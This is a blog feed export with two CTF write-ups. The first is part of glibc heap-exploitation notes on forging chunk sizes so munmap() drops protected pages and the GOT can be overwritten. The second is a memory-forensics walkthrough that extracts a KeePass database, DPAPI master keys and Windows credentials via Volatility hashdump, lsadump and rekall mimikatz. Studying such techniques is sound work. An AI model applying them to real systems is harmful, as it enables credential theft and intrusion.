process will try its best to bring out its virtual memory to satisfy my demand.</li><li>And finally the chunk will be located between 0x10000 - 0x400000 and 0x401000 - 0x601010.</li><li>AS you can see, I get two chunk, one is at 0x10000 and one is at 0x4010000.</li><li><font color="red"> You can just put the fake arena and the fake _nl_global_locale in the 0x10000 chunk and then overwrite the pointer of the arena to 0x10010 (0x10000 + 0x10 is the beginning of the user data).</font></li></ul><h3 id="FURTHERMORE"><a href="#FURTHERMORE" class="headerlink" title="FURTHERMORE"></a>FURTHERMORE</h3><ul><li>The main_arena exploit on x86 is much more easier so I do not mention here.</li><li>A writeup from 217 refers this:</li><li><a href="http://217.logdown.com/posts/241446-isg-2014-pepper" target="_blank" rel="external">http://217.logdown.com/posts/241446-isg-2014-pepper</a></li></ul><h2 id="View-Heap-as-an-Attacker-–-mmap-and-munmap"><a href="#View-Heap-as-an-Attacker-–-mmap-and-munmap" class="headerlink" title="View Heap as an Attacker – mmap() and munmap()"></a>View Heap as an Attacker – mmap() and munmap()</h2><h3 id="OWN-THE-PAGE"><a href="#OWN-THE-PAGE" class="headerlink" title="OWN THE PAGE"></a>OWN THE PAGE</h3><ul><li>A trick</li><li><font color="red"> Turn a <strong>r--</strong> page into <strong>rw-</strong> page without calling mprotect() or even unmap .text page</font>.</li><li><p>Special thanks to <strong>jerry@217</strong> for sharing this idea.</p></li><li><p>As is mentioned before, if a chunk’s <font color="red">SIZE</font> has 0x2 bit, it means this chunk is <strong>MMAPPED</strong>.</p></li><li><p>And if we want to free a MMAPPED chunk, GLIBC will not call free() routine for normal heap chunk but munmap()!</p></li><li><p>If you could overwrite the <strong>SIZE</strong> of a chunk, set its 0x2 bit and any large size you want, then free it!</p><ul><li><font color="red">The memory of the size will be directly kicked out!</font></li></ul></li></ul><ol><li>Malloc()’d for thousands of times to push GLIBC to <font color="red">malloc a chunk at 0x300000 and 0x200000</font>.</li><li>Overflow the chunk at <font color="red">0x200000</font> to make <font color="red">0x300000’s <strong>SIZE</strong></font> to 0x20000<font color="red">2</font>.</li><li><font color="red">0x400000 - 0x401000</font> is .text section of the process.</li></ol><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/3975375.png" alt=""></p><p>It is really interesting right? Memory from <font color="red">0x300000 to 0x500000</font> is munmap()’d by me. $rip is at <font color="red">0x400b7f</font> but it is an illegal address now!</p><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/4391250.png" alt=""></p><p><strong>GOT</strong> is in the marked page. We could allocate a chunk in <font color="red">0x401000-0x601000</font>, overflow it and rewrite <strong>GOT</strong>.</p><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/4549625.png" alt=""></p><p>The sad thing is that if we want to overwrite <strong>GOT</strong>, we must cross <font color="red">0x601000-0x602000</font>, but however this page is non-writable!</p><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/4646984.png" alt=""></p><ul><li>Use heaop heapoverflow to change the <font color="red">SIZE</font> of chunk to 0x10100<font color="red">2</font>. Then free it!</li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/4814390.png" alt=""></p><ul><li>With no surprise, memory from <font color="red">0x501000 to 0x602000</font> is kicked out.</li><li>That means the non-writable page has already gone away.</li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/4828218.png" alt=""></p><p>If we malloc(1052600), Non-writable page <font color="red">0x601000-0x602000</font> will never be existed. Just overflow it to write GOT!</p><ul><li>It is a very interesting trick about mmap() and munmap() in GLIBC heap menagement.</li><li>Keep in mind that the fake <font color="red"><strong>SIZE</strong></font> of the chunk you set must be times of a page size, due to <font color="red">ASSERT</font></li></ul><h2 id="RESOURCES"><a href="#RESOURCES" class="headerlink" title="RESOURCES"></a>RESOURCES</h2><p>STKOK <a href="https://github.com/hitcon2014ctf/ctf/raw/master/a679df07a8f3a8d590febad45336d031-stkof" target="_blank" rel="external">https://github.com/hitcon2014ctf/ctf/raw/master/a679df07a8f3a8d590febad45336d031-stkof</a></p><p>ORED <a href="https://github.com/lovelydream/CTF/blob/master/oreo_35f118d90a7790bbd1eb6d4549993ef0" target="_blank" rel="external">https://github.com/lovelydream/CTF/blob/master/oreo_35f118d90a7790bbd1eb6d4549993ef0</a></p><p>PEPPER <a href="https://github.com/lovelydream/CTF/blob/master/pepper_e87791048cc540b725046a96d6724d8b" target="_blank" rel="external">https://github.com/lovelydream/CTF/blob/master/pepper_e87791048cc540b725046a96d6724d8b</a></p><h2 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h2><p><a href="http://conceptofproof.wordpress.com/2013/11/19/protostar-heap3-walkthrough/" target="_blank" rel="external">http://conceptofproof.wordpress.com/2013/11/19/protostar-heap3-walkthrough/</a></p><p><a href="http://acez.re/" target="_blank" rel="external">http://acez.re/</a></p><p><a href="https://rzhou.org/~ricky/hitcon2014/stkof/test.py" target="_blank" rel="external">https://rzhou.org/~ricky/hitcon2014/stkof/test.py</a></p><p><a href="https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf" target="_blank" rel="external">https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf</a></p><p><a href="http://217.logdown.com/posts/241446-isg-2014-pepper" target="_blank" rel="external">http://217.logdown.com/posts/241446-isg-2014-pepper</a></p><p><a href="http://googleprojectzero.blogspot.sg/2014/08/the-poisoned-nul-byte-2014-edition.html" target="_blank" rel="external">http://googleprojectzero.blogspot.sg/2014/08/the-poisoned-nul-byte-2014-edition.html</a></p><p><a href="http://sebug.net/paper/phrack/66/p66_0x0A_Malloc_Des-Maleficarum.txt" target="_blank" rel="external">http://sebug.net/paper/phrack/66/p66_0x0A_Malloc_Des-Maleficarum.txt</a></p><p><a href="http://www.phrack.org/issues/57/8.html" target="_blank" rel="external">http://www.phrack.org/issues/57/8.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;PLAY-WITH-LINUX-HEAP&quot;&gt;&lt;a href=&quot;#PLAY-WITH-LINUX-HEAP&quot; class=&quot;headerlink&quot; title=&quot;PLAY WITH LINUX HEAP&quot;&gt;&lt;/a&gt;PLAY WITH LINUX HEAP&lt;/h1&gt;&lt;p&gt;作者:&lt;br&gt;&lt;strong&gt;memeda@0ops&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;pwner.xu@gamil.con&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;BACKGROUND&quot;&gt;&lt;a href=&quot;#BACKGROUND&quot; class=&quot;headerlink&quot; title=&quot;BACKGROUND&quot;&gt;&lt;/a&gt;BACKGROUND&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Linux heap become hard to exploit due to the new version of GLIBC.&lt;ul&gt;
&lt;li&gt;Hundreds of thousands of assertions there.&lt;/li&gt;
&lt;li&gt;ASLR and Non-eXecutable heap.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Heap issues are scarce in CTF games.&lt;ul&gt;
&lt;li&gt;spring up in recent games like HOTCON CTF &amp;amp; Hack.LU CTF.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;CATALOGUE&quot;&gt;&lt;a href=&quot;#CATALOGUE&quot; class=&quot;headerlink&quot; title=&quot;CATALOGUE&quot;&gt;&lt;/a&gt;CATALOGUE&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Introduction to GLIBC Heap&lt;/li&gt;
&lt;li&gt;View Heap As an Attacker&lt;ul&gt;
&lt;li&gt;free()&lt;/li&gt;
&lt;li&gt;malloc()&lt;/li&gt;
&lt;li&gt;main_arena&lt;/li&gt;
&lt;li&gt;mmap() &amp;amp; munmap()&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Examples&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="PWN" scheme="http://blog.flier.net.cn/categories/PWN/"/>
    
    
      <category term="PWN" scheme="http://blog.flier.net.cn/tags/PWN/"/>
    
      <category term="HEAP" scheme="http://blog.flier.net.cn/tags/HEAP/"/>
    
  </entry>
  
  <entry>
    <title>karspersky-helpme</title>
    <link href="http://blog.flier.net.cn/2017/10/19/karspersky-helpme/"/>
    <id>http://blog.flier.net.cn/2017/10/19/karspersky-helpme/</id>
    <published>2017-10-18T17:59:11.000Z</published>
    <updated>2017-10-18T19:11:34.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="karspersky-Helpme"><a href="#karspersky-Helpme" class="headerlink" title="karspersky Helpme"></a>karspersky Helpme</h1><h2 id="常规分析"><a href="#常规分析" class="headerlink" title="常规分析"></a>常规分析</h2><h3 id="查看内存快照的属性"><a href="#查看内存快照的属性" class="headerlink" title="查看内存快照的属性"></a>查看内存快照的属性</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem imageinfo</div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</div><div class="line">          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86</div><div class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</div><div class="line">                     AS Layer2 : FileAddressSpace (/home/flier/Desktop/karspersky/helpme/memory.vmem)</div><div class="line">                      PAE <span class="built_in">type</span> : PAE</div><div class="line">                           DTB : 0x185000L</div><div class="line">                          KDBG : 0x82961be8L</div><div class="line">          Number of Processors : 1</div><div class="line">     Image Type (Service Pack) : 0</div><div class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0x82962c00L</div><div class="line">             KUSER_SHARED_DATA : 0xffdf0000L</div><div class="line">           Image date and time : 2017-09-25 12:18:53 UTC+0000</div><div class="line">     Image <span class="built_in">local</span> date and time : 2017-09-25 15:18:53 +0300</div></pre></td></tr></table></figure><a id="more"></a><h3 id="查看内存快照的进程"><a href="#查看内存快照的进程" class="headerlink" title="查看内存快照的进程"></a>查看内存快照的进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem --profile=Win7SP0x86 pstree</div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">Name                                                  Pid   PPid   Thds   Hnds Time</div><div class="line">-------------------------------------------------- ------ ------ ------ ------ ----</div><div class="line"> 0x86aa8328:wininit.exe                               400    336      3     74 2017-09-25 12:08:15 UTC+0000</div><div class="line">. 0x86d28558:lsm.exe                                  516    400      9    141 2017-09-25 12:08:15 UTC+0000</div><div class="line">. 0x8cbc0030:services.exe                             500    400      7    191 2017-09-25 12:08:15 UTC+0000</div><div class="line">.. 0x86f094f8:svchost.exe                             768    500     20    452 2017-09-25 12:08:16 UTC+0000</div><div class="line">.. 0x870aa3b8:vmtoolsd.exe                           1684    500      9    288 2017-09-25 12:08:18 UTC+0000</div><div class="line">... 0x85730030:cmd.exe                               1956   1684      0 ------ 2017-09-25 12:18:53 UTC+0000</div><div class="line">.... 0x86185880:ipconfig.exe                         3096   1956      0 ------ 2017-09-25 12:18:53 UTC+0000</div><div class="line">.. 0x86fbd500:spoolsv.exe                            1304    500     13    324 2017-09-25 12:08:17 UTC+0000</div><div class="line">.. 0x86f42860:svchost.exe                             924    500     35    910 2017-09-25 12:08:16 UTC+0000</div><div class="line">.. 0x86ee49d0:vmacthlp.exe                            680    500      3     53 2017-09-25 12:08:16 UTC+0000</div><div class="line">.. 0x86da7a58:svchost.exe                             884    500     19    430 2017-09-25 12:08:16 UTC+0000</div><div class="line">... 0x87036030:dwm.exe                               1492    884      5    113 2017-09-25 12:08:17 UTC+0000</div><div class="line">.. 0x86fd9538:svchost.exe                            1344    500     20    307 2017-09-25 12:08:17 UTC+0000</div><div class="line">.. 0x870ded40:msdtc.exe                              2252    500     14    154 2017-09-25 12:08:29 UTC+0000</div><div class="line">.. 0x86c3a7b8:svchost.exe                             716    500      8    251 2017-09-25 12:08:16 UTC+0000</div><div class="line">.. 0x86f81030:svchost.exe                            1144    500     15    369 2017-09-25 12:08:16 UTC+0000</div><div class="line">.. 0x8722cd40:SearchIndexer.                         2008    500     12    558 2017-09-25 12:08:26 UTC+0000</div><div class="line">.. 0x8709c6a8:VGAuthService.                         1636    500      3     87 2017-09-25 12:08:18 UTC+0000</div><div class="line">.. 0x85085488:sppsvc.exe                             3808    500      4    151 2017-09-25 12:10:21 UTC+0000</div><div class="line">.. 0x86dcb030:svchost.exe                             620    500     11    350 2017-09-25 12:08:15 UTC+0000</div><div class="line">... 0x86313800:WmiPrvSE.exe                          1732    620     10    199 2017-09-25 12:08:25 UTC+0000</div><div class="line">... 0x872a8848:WmiPrvSE.exe                          2552    620      9    219 2017-09-25 12:08:45 UTC+0000</div><div class="line">.. 0x86f71b78:svchost.exe                            1064    500     12    560 2017-09-25 12:08:16 UTC+0000</div><div class="line">.. 0x856aea58:svchost.exe                            3844    500     12    350 2017-09-25 12:10:21 UTC+0000</div><div class="line">.. 0x870107a0:taskhost.exe                           1400    500      7    150 2017-09-25 12:08:17 UTC+0000</div><div class="line">.. 0x871f1480:dllhost.exe                             852    500     15    199 2017-09-25 12:08:25 UTC+0000</div><div class="line">. 0x86d2c188:lsass.exe                                508    400      6    538 2017-09-25 12:08:15 UTC+0000</div><div class="line"> 0x86b11d40:csrss.exe                                 348    336      8    415 2017-09-25 12:08:15 UTC+0000</div><div class="line">. 0x8504a7d8:conhost.exe                              476    348      0 ------ 2017-09-25 12:18:53 UTC+0000</div><div class="line"> 0x8703cc48:explorer.exe                             1508   1476     24    763 2017-09-25 12:08:17 UTC+0000</div><div class="line">. 0x87100030:vmtoolsd.exe                            1792   1508      7    198 2017-09-25 12:08:19 UTC+0000</div><div class="line">. 0x872a9458:KeePass.exe                             2464   1508      7    304 2017-09-25 12:08:33 UTC+0000</div><div class="line"> 0x84f4a8e8:System                                      4      0     87    397 2017-09-25 12:08:14 UTC+0000</div><div class="line">. 0x8c537930:smss.exe                                 264      4      2     29 2017-09-25 12:08:14 UTC+0000</div><div class="line"> 0x86bb5d40:csrss.exe                                 408    392     10    192 2017-09-25 12:08:15 UTC+0000</div><div class="line"> 0x86ca2920:winlogon.exe                              456    392      3    117 2017-09-25 12:08:15 UTC+0000</div></pre></td></tr></table></figure><h3 id="dump-屏幕"><a href="#dump-屏幕" class="headerlink" title="dump 屏幕"></a>dump 屏幕</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem --profile=Win7SP0x86 screenshot -D ./dump_true </div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">Wrote ./dump_true/session_0.msswindowstation.mssrestricteddesk.png</div><div class="line">Wrote ./dump_true/session_0.Service-0x0-3e4$.Default.png</div><div class="line">Wrote ./dump_true/session_0.Service-0x0-3e5$.Default.png</div><div class="line">Wrote ./dump_true/session_1.WinSta0.Default.png</div><div class="line">Wrote ./dump_true/session_1.WinSta0.Disconnect.png</div><div class="line">Wrote ./dump_true/session_1.WinSta0.Winlogon.png</div><div class="line">Wrote ./dump_true/session_0.Service-0x0-3e7$.Default.png</div><div class="line">Wrote ./dump_true/session_0.WinSta0.Default.png</div><div class="line">Wrote ./dump_true/session_0.WinSta0.Disconnect.png</div><div class="line">Wrote ./dump_true/session_0.WinSta0.Winlogon.png</div></pre></td></tr></table></figure><p><img src="/2017/10/19/karspersky-helpme/desktop_shot.png" alt="KeePass"></p><ul><li>发现这个地方有问题，是用的KeePass秘钥管理软件开启了一个叫<strong>FlagDatabase.kdbx</strong>的数据库</li><li>于是，扫描文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem --profile=Win7SP0x86 filescan | grep FlagDatabase.kdbx  </div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">0x000000003daeb2c0      8      0 R--r-- \Device\HarddiskVolume1\Users\user\FlagDatabase.kdbx</div></pre></td></tr></table></figure><ul><li>Dump 下来再说</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem --profile=Win7SP0x86 dumpfiles -Q 0x000000003daeb2c0 -D ./dump_true </div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">DataSectionObject 0x3daeb2c0   None   \Device\HarddiskVolume1\Users\user\FlagDatabase.kdbx</div></pre></td></tr></table></figure><font color="red">volatility dump文件都是按照page的大小dump，要记得去除结尾的无用部分，这里就不一一赘述了</font><h2 id="进一步分析"><a href="#进一步分析" class="headerlink" title="进一步分析"></a>进一步分析</h2><h3 id="查找KeePass配置文件"><a href="#查找KeePass配置文件" class="headerlink" title="查找KeePass配置文件"></a>查找KeePass配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem --profile=Win7SP0x86 filescan | grep KeePass                       </div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">0x000000003da006c0      8      0 R--r-- \Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\KeePass.config.xml</div><div class="line">0x000000003da0e170      6      0 R--r<span class="_">-d</span> \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePassLibC32.dll</div><div class="line">0x000000003da27ae0      8      0 R--r-- \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.config.xml</div><div class="line">0x000000003daa8e10      2      0 R--r-- \Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\ProtectedUserKey.bin</div><div class="line">0x000000003dce1850      6      0 R--r<span class="_">-d</span> \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\unins000.exe</div><div class="line">0x000000003dd01568      8      0 R--r<span class="_">-d</span> \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.exe.config</div><div class="line">0x000000003dd01b78      8      0 R--r<span class="_">-d</span> \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.exe</div><div class="line">0x000000003dd14a00      7      0 R--r<span class="_">-d</span> \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.exe</div><div class="line">0x000000003ddb55f8      1      1 R--rw- \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2</div><div class="line">0x000000003ddb8bc8      5      0 R--r<span class="_">-d</span> \Device\HarddiskVolume1\Windows\assembly\NativeImages_v2.0.50727_32\KeePass\61401321a8fb44541efab9aa5fb7fb69\KeePass.ni.exe</div><div class="line">0x000000003e9f8468      8      0 R--r<span class="_">-d</span> \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.XmlSerializers.dll</div><div class="line">0x000000003e9f8678      4      1 R--r<span class="_">-d</span> \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.XmlSerializers.dll</div><div class="line">0x000000003ef96eb8      8      0 R--rw- \Device\HarddiskVolume1\Users\user\Desktop\KeePass 2.lnk</div><div class="line">0x000000003ff6deb8      8      0 R--rw- \Device\HarddiskVolume1\Users\user\Desktop\KeePass 2.lnk</div></pre></td></tr></table></figure><h3 id="Dump-Device-HarddiskVolume1-Users-user-AppData-Roaming-KeePass-KeePass-config-xml"><a href="#Dump-Device-HarddiskVolume1-Users-user-AppData-Roaming-KeePass-KeePass-config-xml" class="headerlink" title="Dump \Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\KeePass.config.xml"></a>Dump <strong>\Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\KeePass.config.xml</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem --profile=Win7SP0x86 dumpfiles -Q 0x000000003da006c0 -D ./dump_true</div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">DataSectionObject 0x3da006c0   None   \Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\KeePass.config.xml</div></pre></td></tr></table></figure><h3 id="分析配置文件"><a href="#分析配置文件" class="headerlink" title="分析配置文件"></a>分析配置文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">131         <span class="tag">&lt;/<span class="name">PasswordGenerator</span>&gt;</span></div><div class="line">132         <span class="tag">&lt;<span class="name">Defaults</span>&gt;</span></div><div class="line">133                 <span class="tag">&lt;<span class="name">OptionsTabIndex</span>&gt;</span>0<span class="tag">&lt;/<span class="name">OptionsTabIndex</span>&gt;</span></div><div class="line">134                 <span class="tag">&lt;<span class="name">SearchParameters</span>&gt;</span></div><div class="line">135                         <span class="tag">&lt;<span class="name">ComparisonMode</span>&gt;</span>InvariantCultureIgnoreCase<span class="tag">&lt;/<span class="name">ComparisonMode</span>&gt;</span></div><div class="line">136                 <span class="tag">&lt;/<span class="name">SearchParameters</span>&gt;</span></div><div class="line">137                 <span class="tag">&lt;<span class="name">KeySources</span>&gt;</span></div><div class="line">138                         <span class="tag">&lt;<span class="name">Association</span>&gt;</span></div><div class="line">139                                 <span class="tag">&lt;<span class="name">DatabasePath</span>&gt;</span>..\..\Users\user\FlagDatabase.kdbx<span class="tag">&lt;/<span class="name">DatabasePath</span>&gt;</span></div><div class="line">140                                 <span class="tag">&lt;<span class="name">UserAccount</span>&gt;</span>true<span class="tag">&lt;/<span class="name">UserAccount</span>&gt;</span></div><div class="line">141                         <span class="tag">&lt;/<span class="name">Association</span>&gt;</span></div><div class="line">142                 <span class="tag">&lt;/<span class="name">KeySources</span>&gt;</span></div><div class="line">143         <span class="tag">&lt;/<span class="name">Defaults</span>&gt;</span></div><div class="line">144         <span class="tag">&lt;<span class="name">Integration</span>&gt;</span></div><div class="line">145                 <span class="tag">&lt;<span class="name">HotKeyGlobalAutoType</span>&gt;</span>393281<span class="tag">&lt;/<span class="name">HotKeyGlobalAutoType</span>&gt;</span></div><div class="line">146                 <span class="tag">&lt;<span class="name">HotKeySelectedAutoType</span>&gt;</span>0<span class="tag">&lt;/<span class="name">HotKeySelectedAutoType</span>&gt;</span></div><div class="line">147                 <span class="tag">&lt;<span class="name">HotKeyShowWindow</span>&gt;</span>393291<span class="tag">&lt;/<span class="name">HotKeyShowWindow</span>&gt;</span></div></pre></td></tr></table></figure><ul><li>这里的UserAccount置位true，表明使用了windows 用户的 <strong>master key</strong> 进行加密</li><li>由于没有其他的加密选项，所以就是只用了windows的账户验证这一种加密</li></ul><h2 id="奔向答案"><a href="#奔向答案" class="headerlink" title="奔向答案"></a>奔向答案</h2><p>参考 <a href="http://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/" target="_blank" rel="external">http://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/</a></p><p>要恢复一个操作系统上用KeePass的windows账户验证加密的数据库，我们需要以下条件：</p><ul><li><post color="red">%APPDATA%\Microsoft\Protect\<sid></sid></post>目录下的所有文件<ul><li>Preferred</li><li>master key file with a GUID naming (<strong>Windows账户主密钥文件</strong>) </li></ul></li><li>KeePass加密使用的软件主密钥<ul><li>ProtectedUserKey.bin</li></ul></li><li>Windows账户的信息<ul><li>UserDomain</li><li><strong>密码</strong></li><li>SID</li><li>UserName</li></ul></li><li>xxxx.kdbx 加密后的秘钥数据库</li></ul><p>目前，我们缺少的就是:</p><ul><li>%APPDATA%\Microsoft\Protect\<sid>目录下的所有文件</sid></li><li>KeePass加密使用的软件主密钥</li><li>Windows账户的信息</li></ul><h3 id="搞SID目录下的文件"><a href="#搞SID目录下的文件" class="headerlink" title="搞SID目录下的文件"></a>搞SID目录下的文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x000000003daa8d58      2      0 R--r-- \Device\HarddiskVolume1\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-196189514-4237867838-3788442389-1000\Preferred</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem --profile=Win7SP0x86 dumpfiles -Q 0x000000003daa8d58 -D ./dump_true</div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">DataSectionObject 0x3daa8d58   None   \Device\HarddiskVolume1\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-196189514-4237867838-3788442389-1000\Preferred</div></pre></td></tr></table></figure><font color="red"> 这里有个坑点，就是  \Device\HarddiskVolume1\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-196189514-4237867838-3788442389-1000\7315eeac-ce04-46ff-87ac-4fc9cf1d41d3 windows主密钥文件搞不下来 </font><p>无奈之下，只好通过主密钥文件的特征进行搜索</p><p><img src="/2017/10/19/karspersky-helpme/master_key.png" alt="master key"></p><h3 id="搞ProtectedUserKey-bin"><a href="#搞ProtectedUserKey-bin" class="headerlink" title="搞ProtectedUserKey.bin"></a>搞<strong>ProtectedUserKey.bin</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem --profile=Win7SP0x86 dumpfiles -Q 0x000000003daa8e10 -D ./dump_true</div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">DataSectionObject 0x3daa8e10   None   \Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\ProtectedUserKey.bin</div></pre></td></tr></table></figure><h3 id="搞用户信息"><a href="#搞用户信息" class="headerlink" title="搞用户信息"></a>搞用户信息</h3><h4 id="尝试hashdump，发现密码太长，搞不定"><a href="#尝试hashdump，发现密码太长，搞不定" class="headerlink" title="尝试hashdump，发现密码太长，搞不定"></a>尝试hashdump，发现密码太长，搞不定</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem --profile=Win7SP0x86 hashdump</div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</div><div class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</div><div class="line">user:1000:aad3b435b51404eeaad3b435b51404ee:8943ccc24f82983c8b791b7f648679c0:::</div></pre></td></tr></table></figure><h4 id="尝试rekall-mimikatz，搞定"><a href="#尝试rekall-mimikatz，搞定" class="headerlink" title="尝试rekall mimikatz，搞定"></a>尝试rekall mimikatz，搞定</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rekall -f memory.vmem mimikatz</div></pre></td></tr></table></figure><h4 id="lsadump-也可以"><a href="#lsadump-也可以" class="headerlink" title="lsadump 也可以"></a>lsadump 也可以</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">volatility -f ./memory.vmem --profile=Win7SP0x86 lsadump </div><div class="line">Volatility Foundation Volatility Framework 2.6</div><div class="line">DefaultPassword</div><div class="line">0x00000000  4e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   N...............</div><div class="line">0x00000010  79 00 6f 00 75 00 5f 00 6e 00 65 00 65 00 64 00   y.o.u._.n.e.e.d.</div><div class="line">0x00000020  5f 